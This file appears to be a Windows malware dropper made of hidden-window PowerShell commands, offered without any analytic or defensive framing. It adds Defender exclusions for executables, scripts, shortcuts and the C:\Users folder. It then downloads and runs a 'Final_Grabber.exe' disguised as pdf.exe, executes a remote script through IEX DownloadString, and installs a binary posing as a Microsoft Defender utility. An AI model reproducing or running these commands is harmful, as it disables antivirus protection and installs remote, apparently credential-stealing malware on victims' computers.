powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"


powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
powershell.exe -w Hidden C:\Users\pdf.exe

powershell.exe -Windowstyle Hidden -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rude90/Power--Shell/main/hacked_out_5656.ps1');"


powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
